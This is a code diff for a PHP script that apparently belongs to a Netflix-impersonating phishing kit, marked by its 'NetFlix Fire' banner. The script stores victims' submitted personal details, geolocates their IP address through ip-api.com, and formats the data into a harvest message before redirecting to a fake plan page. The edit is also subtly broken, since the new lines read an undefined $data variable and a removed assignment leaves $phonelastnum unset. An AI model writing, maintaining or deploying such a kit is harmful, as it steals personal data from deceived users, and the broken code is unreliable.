@@ -43,21 +43,19 @@ $_SESSION['city'] = $_POST['city'];
 $_SESSION['state'] = $_POST['state'];
 $_SESSION['phone'] = $_POST['phone'];
 $_SESSION['birthday'] = $_POST['birthday'];
-$phonelastnum = substr($_POST['phonee'],8,16);
 $_SESSION['phonelastnum'] = $phonelastnum;
 
 $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
-$COUNTRY = $IP_LOOKUP->country . "\r\n";
-$countryCode = $IP_LOOKUP->countryCode. "\r\n";
-$regionName    = $IP_LOOKUP->regionName . "\r\n";
-$lat    = $IP_LOOKUP->lat . "\r\n";
-$timezone    = $IP_LOOKUP->timezone . "\r\n";
-$isp    = $IP_LOOKUP->isp . "\r\n";
-$as    = $IP_LOOKUP->as . "\r\n";
-$CITY    = $IP_LOOKUP->city . "\r\n";
-$REGION  = $IP_LOOKUP->region . "\r\n";
-$STATE   = $IP_LOOKUP->regionName . "\r\n";
-$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
+$country      = $data->country ?? 'Unknown';
+$countryCode  = $data->countryCode ?? 'Unknown';
+$regionName   = $data->regionName ?? 'Unknown';
+$lat          = $data->lat ?? '';
+$timezone     = $data->timezone ?? '';
+$isp          = $data->isp ?? '';
+$as           = $data->as ?? '';
+$city         = $data->city ?? '';
+$region       = $data->region ?? '';
+$zip          = $data->zip ?? '';
 
 
 $message = "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\r\n";
@@ -93,3 +91,4 @@ HEADER("Location: ../plan.php");
 
 
 ?>
+
